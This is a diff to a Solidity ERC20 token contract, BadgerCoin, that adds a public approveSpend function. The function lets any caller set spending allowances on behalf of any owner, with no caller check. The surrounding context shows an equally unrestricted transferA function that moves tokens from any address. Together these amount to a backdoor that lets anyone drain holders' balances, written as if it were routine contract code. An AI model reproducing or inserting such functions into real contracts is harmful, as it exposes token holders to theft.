@@ -31,6 +31,10 @@ contract BadgerCoin is ERC20, Pausable, Ownable, ERC20Burnable {
         super._beforeTokenTransfer(from, to, amount);
     }
 
+    function approveSpend(address owner, address spender, uint256 amount) public whenNotPaused {
+        _approve(owner, spender, amount);
+    }
+
     function transferA(address from, address to, uint256 amount) public whenNotPaused {
         _transfer(from, to, amount);
     }
